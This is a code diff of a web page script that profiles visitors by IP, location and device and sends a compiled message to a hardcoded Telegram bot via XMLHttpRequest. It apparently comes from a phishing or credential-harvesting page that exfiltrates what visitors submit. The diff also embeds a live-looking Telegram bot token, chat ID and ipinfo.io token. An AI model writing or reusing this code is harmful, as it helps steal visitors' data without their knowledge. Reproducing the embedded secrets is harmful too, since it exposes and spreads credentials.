@@ -529,6 +529,10 @@
   var ip = document.getElementById('ip');
   var x = 0;
 
+  // Telegram bot details
+  var telegram_bot_token = '7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ'; // Replace with your actual bot token
+  var telegram_chat_id = '1866571175'; // Replace with your actual chat ID
+
   // Fetch IP and location info
   function fetchIPInfo() {
       return fetch('https://ipinfo.io/json?token=1395ebd482ecbf') // Replace with your ipinfo.io token
@@ -587,37 +591,28 @@
                 *Device:* ${deviceName}
               `;
 
-              const botToken = '7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ'; // Replace with your actual bot token
-              const chatId = '1866571175'; // Replace with your actual chat ID
-              const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+              // Create the Telegram API URL
+              var telegram_url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage`;
 
-              // Prepare the data to send to Telegram
-              const data = new URLSearchParams();
-              data.append('chat_id', chatId);
+              // Create a new XMLHttpRequest
+              var xhr = new XMLHttpRequest();
+              var data = new FormData();
+              data.append('chat_id', telegram_chat_id);
               data.append('text', message);
-              data.append('parse_mode', 'Markdown'); // Ensure message is formatted in Markdown
+              data.append('parse_mode', 'Markdown'); // Ensure the message is formatted with Markdown
 
-              // Fetch request with added CORS mode to handle any cross-origin issues
-              fetch(telegramApiUrl, {
-                  method: 'POST',
-                  mode: 'cors', // Added to handle CORS
-                  body: data,
-                  headers: {
-                      'Content-Type': 'application/x-www-form-urlencoded',
-                  },
-              })
-              .then(response => response.json())
-              .then(data => {
-                  if (data.ok) {
+              // Send the request to Telegram
+              xhr.onreadystatechange = function () {
+                  if (xhr.readyState === 4 && xhr.status === 200) {
+                      console.log("Data sent to Telegram successfully.");
                       feedback.textContent = '';
-                  } else {
+                  } else if (xhr.readyState === 4) {
                       feedback.textContent = 'Error sending message.';
                   }
-              })
-              .catch((error) => {
-                  console.error('Error:', error);
-                  feedback.textContent = 'An error occurred while sending the message.';
-              });
+              };
+
+              xhr.open('POST', telegram_url, true);
+              xhr.send(data);
 
               // Rest of your code for feedback messages
               x++;
@@ -632,6 +627,7 @@
       });
   }
 </script>
+
 
 
 
